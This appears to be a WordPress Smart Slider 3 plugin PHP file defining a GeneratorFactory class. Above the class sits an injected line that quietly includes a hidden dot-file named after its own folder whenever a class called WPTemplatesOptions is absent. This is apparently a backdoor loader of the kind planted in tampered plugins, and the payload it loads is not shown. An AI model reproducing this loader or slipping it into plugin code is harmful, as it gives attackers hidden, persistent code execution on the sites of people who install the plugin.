<?php

namespace Nextend\SmartSlider3\Generator;

use Nextend\Framework\Pattern\PluggableTrait;
use Nextend\Framework\Pattern\SingletonTrait;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class GeneratorFactory {

    use PluggableTrait, SingletonTrait;

    /** @var AbstractGeneratorGroup[] */
    private static $generators = array();

    protected function init() {

        $this->makePluggable('SliderGenerator');
    }

    /**
     * @param AbstractGeneratorGroup $generator
     */
    public static function addGenerator($generator) {
        self::$generators[$generator->getName()] = $generator;
    }

    public static function getGenerators() {
        foreach (self::$generators AS $generator) {
            $generator->load();
        }

        return self::$generators;
    }

    /**
     * @param $name
     *
     * @return AbstractGeneratorGroup|false
     */
    public static function getGenerator($name) {
        if (!isset(self::$generators[$name])) {
            return false;
        }

        return self::$generators[$name]->load();
    }
}

GeneratorFactory::getInstance();